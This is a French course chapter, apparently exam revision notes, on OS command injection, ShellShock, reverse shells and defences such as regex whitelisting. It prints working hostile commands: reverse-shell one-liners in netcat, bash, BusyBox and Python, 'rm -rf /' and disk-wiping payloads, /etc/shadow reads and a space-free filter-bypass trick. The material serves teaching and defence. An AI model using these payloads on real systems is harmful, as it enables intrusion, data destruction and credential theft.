# Chapitre 4 -- Injection de commandes

> Source : 2026-Command Injections.pdf, 2026 Shell for Security.pdf
> Objectif : comprendre les injections de commandes OS, les reverse shells, et les protections

---

## 4.1 Concept de base

### Le probleme : appeler le systeme d'exploitation

Quand une application web utilise une commande systeme avec des parametres fournis par l'utilisateur, une injection de commande devient possible.

```
Application web                     Systeme d'exploitation
     |                                      |
     |  system("ping -c4 " + $IP)           |
     |------------------------------------->|
     |                                      |
     |  Resultat du ping                    |
     |<-------------------------------------|
```

### Le mecanisme

Les caracteres speciaux du shell permettent d'enchainer des commandes :

| Caractere | Role |
|-----------|------|
| `;` | Separateur de commandes |
| `\|` | Pipe (sortie d'une commande --> entree d'une autre) |
| `&&` | Execute la 2e commande seulement si la 1ere reussit |
| `\|\|` | Execute la 2e commande seulement si la 1ere echoue |
| `` `cmd` `` | Substitution de commande |
| `$(cmd)` | Substitution de commande (syntaxe moderne) |

---

## 4.2 Exemples d'injection

### Exemple 1 : Fonction de ping

**Cas normal :**
```
Adresse saisie : 210.1.43.27
Commande executee : ping -c4 210.1.43.27 >& /www/tmp/result
```

**Injection basique :**
```
Adresse saisie : 210.1.43.27;rm -rf /
Commande executee : ping -c4 210.1.43.27;rm -rf / >& /www/tmp/result
```

Le point-virgule separe les deux commandes. Le systeme execute d'abord le ping, puis `rm -rf /`.

**Injection avec reverse shell :**
```
Adresse saisie : 210.1.43.27; sh -i >& /dev/tcp/192.168.174.1/4443 0>&1;
Commande executee : ping 210.1.43.27; sh -i >& /dev/tcp/192.168.174.1/4443 0>&1; >& /www/tmp/result
```

L'attaquant obtient un shell interactif sur la machine cible.

### Exemple 2 : Substitution de commande

```bash
$ ./perroquet.sh "`ls`"
personnal.txt private.png secret.odt

$ ./perroquet.sh `cat /etc/shadow`
root:*:17431:0:99999:7::: daemon:*:17431:0:99999:7:::

$ ./perroquet.sh `rm -Rf /`
# Destruction du systeme de fichiers
```

Les backticks executent la commande a l'interieur avant de passer le resultat au script.

### Exemple 3 : ShellShock (CVE-2014-6271)

```bash
# Test de vulnerabilite
env x='() { :;}; echo vuln' bash -c "test"
# Si affiche "vuln", la machine est vulnerable

# Exploitation via HTTP User-Agent
curl -A "() { :;};cat /etc/passwd" http://target.example/cgi-bin/some.cgi
```

ShellShock exploite un bug dans le parsing des fonctions dans les variables d'environnement Bash.

---

## 4.3 Reverse shells

Un reverse shell est une technique ou la machine compromise initie la connexion vers l'attaquant (contourne les firewalls).

### Schema

```
Machine attaquant               Machine cible
(IP: 192.168.174.1)            (compromise)
     |                              |
     |  nc -lvp 4443               |
     |  (ecoute sur port 4443)     |
     |                              |
     |<-----------------------------|
     |  Connexion initiee par       |
     |  la cible (reverse)          |
     |                              |
     |  Shell interactif            |
     |<---------------------------->|
```

### Variantes de reverse shells

**Avec netcat :**
```bash
# Attaquant (listener)
nc -lvp 4443

# Cible (payload)
nc -e /bin/sh 192.168.174.1 4443
```

**Avec bash :**
```bash
bash -i >& /dev/tcp/192.168.174.1/4443 0>&1
```

**Avec BusyBox (appareils embarques) :**
```bash
rm f ; mknod f p ; cat f | /bin/sh -i 2>&1 | nc 192.168.174.1 4443 > f
```

**Avec Python :**
```python
python -c '
import socket,os,pty;
s=socket.socket();
s.connect(("192.168.174.1",4443));
[os.dup2(s.fileno(),d) for d in (0,1,2)];
pty.spawn("/bin/sh")
'
```

**Avec chiffrement SSL :**
```bash
# Listener
nc --ssl -lvp 4443

# Payload
nc --ssl -e /bin/sh 192.168.174.1 4443
```

**Attention -- services dangereux :**
```bash
# NE JAMAIS FAIRE CECI sur un systeme non controle :
curl https://reverse-shell.sh/yourip:4443|sh
```

---

## 4.4 Le shell comme outil de securite

Le cours couvre aussi l'utilisation du shell a des fins defensives.

### Commandes utiles pour l'analyse

| Commande | Usage securite |
|----------|---------------|
| `cat`, `tac`, `rev` | Analyser le contenu de fichiers |
| `cut`, `paste` | Isoler des colonnes dans des logs |
| `sort \| uniq -c \| sort -nr` | Frequence des termes (top-N) |
| `wc -L` | Trouver les lignes anormalement longues |
| `fgrep -Iri passw` | Rechercher des mots de passe dans les fichiers |
| `find . -name "*.txt" -exec` | Recherche recursive avec action |
| `script -a session.log` | Enregistrer une session (utile pour pentest) |
| `shuf file -n 32` | Echantillon aleatoire de 32 lignes |

### Glyphes speciaux du shell

| Glyphe | Fonction |
|--------|----------|
| `;` ou `\n` | Separateur de commandes |
| `\|` | Pipe |
| `>`, `>>`, `<` | Redirections |
| `<( ... )` | Substitution de processus |
| `&` | Execution en arriere-plan |
| `{cmd,arg1,arg2}` | Syntaxe sans espaces (utile pour contourner des filtres) |
| `>&` | Redirection de descripteurs (0=stdin, 1=stdout, 2=stderr) |

### Astuce anti-detection : eviter les espaces

```bash
# Ces deux commandes sont equivalentes :
cat file1 file2
{cat,file1,file2}
```

La syntaxe `{cmd,arg1,arg2}` permet d'eviter les espaces dans les payloads, ce qui contourne certains filtres.

---

## 4.5 Protections contre l'injection de commandes

### Principe

Reference : **OWASP OS Command Injection Defense Cheat Sheet**

### Hierarchie des protections

```
Meilleure protection
    |
    v
1. EVITER les appels systeme (utiliser les fonctions natives du langage)
2. Whitelist + framework
3. Encoder, echapper, utiliser les fonctions du langage
4. Blacklist (jamais complete)
5. "Hope no-one will inject here" (MAUVAIS)
    |
    v
Pire "protection"
```

### Exemple concret : proteger la fonction ping

**Le probleme :** on doit verifier une adresse IPv4
```
On ne peut pas toujours eviter l'appel systeme (ping est un outil OS)
```

**La solution : whitelist par regex**

```
Sur-approximation permissive :
allow 999.999.999.999

Regex stricte :
^([0-9]{1,3}\.){3}[0-9]{1,3}$

Ou equivalemment :
^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$
```

Toute entree qui ne correspond pas a ce motif est rejetee, empechant l'injection de `;`, `|`, `&&`, etc.

### Les entrees suspectes (toutes !)

Ce n'est pas seulement les champs de formulaire qui sont dangereux :

```
Sources d'entrees potentiellement malicieuses :
    +-- Entrees utilisateur explicites (formulaires, URL)
    +-- Variables d'environnement
    +-- Valeurs fournies par d'autres serveurs
    +-- Cookies
    +-- Date et heure
    +-- Fichiers de sauvegarde
    +-- ...

Regle : ne jamais faire confiance a une valeur
        sans une verification RECENTE
```

---

## 4.6 Exemples de DS

### Sujet 2025, Question 1.1

Identifier les injections de commandes dans les logs :
```
test.php?action="ping"&address="216.120.237.101"&dir C:\"     --> CMD
test.php?traceroute="|| echo reboot > /etc/rc.local"          --> CMD
dostuff.php?dir=; dd if=/dev/urandom of=/dev/sda bs=4069;     --> CMD
```

**Indices pour identifier une injection CMD :**
- Presence de `;`, `|`, `||`, `&&`
- Noms de commandes systeme (`echo`, `cat`, `rm`, `dd`, `sleep`)
- Chemins de fichiers systeme (`/etc/`, `/dev/`, `C:\`)
- Redirections (`>`, `>>`)

### Sujet 2020, Exercice 2

Tests revelateurs :
```
Test 1 : Login = ' OR 'a'='a   --> Reponse: -bash: OR: command not found
Test 3 : Login = ' ; /bin/sleep 10 --> L'app met 10 secondes
Test 4 : Login = ' ; /bin/cat /etc/shadow --> Permission denied
```

**Analyse :**
- Test 1 : le `OR` est interprete comme une commande bash, pas du SQL --> injection de commande
- Test 3 : le `sleep 10` s'execute --> injection de commande confirmee
- Test 4 : le `cat /etc/shadow` echoue car manque de privileges, mais l'injection fonctionne

---

## 4.7 Pieges courants

1. **Confondre injection SQL et injection de commande** : en DS, bien regarder le message d'erreur (erreur SQL vs erreur bash)
2. **Oublier les substitutions de commandes** : `` `cmd` `` et `$(cmd)` sont aussi dangereux que `;`
3. **Penser que filtrer le `;` suffit** : il y a aussi `|`, `||`, `&&`, `` ` ``, `$(...)`, `\n`
4. **Ignorer la syntaxe `{cmd,args}`** : permet de contourner les filtres sur les espaces
5. **Sous-estimer ShellShock** : meme des variables d'environnement peuvent contenir des injections
6. **Oublier que les reverse shells contournent les firewalls** : c'est la cible qui initie la connexion

---

## 4.8 Recapitulatif

```
INJECTION DE COMMANDES
    |
    +-- Mecanisme : concatenation d'entrees dans un appel systeme
    |
    +-- Separateurs : ;  |  ||  &&  `cmd`  $(cmd)  \n
    |
    +-- Exploitations :
    |       +-- Execution de commandes arbitraires
    |       +-- Reverse shell (nc, bash, python)
    |       +-- Lecture de fichiers sensibles (/etc/shadow)
    |
    +-- Protections :
    |       +-- EVITER les appels OS (fonctions natives)
    |       +-- Whitelist (regex stricte)
    |       +-- Ne JAMAIS faire confiance aux entrees
    |
    +-- Cas celebre : ShellShock (CVE-2014-6271)
    |
    +-- Shell en securite :
            +-- Analyse de logs (sort | uniq -c | sort -nr)
            +-- Enregistrement de sessions (script -a)
            +-- Recherche de mots de passe (fgrep -Iri)
```
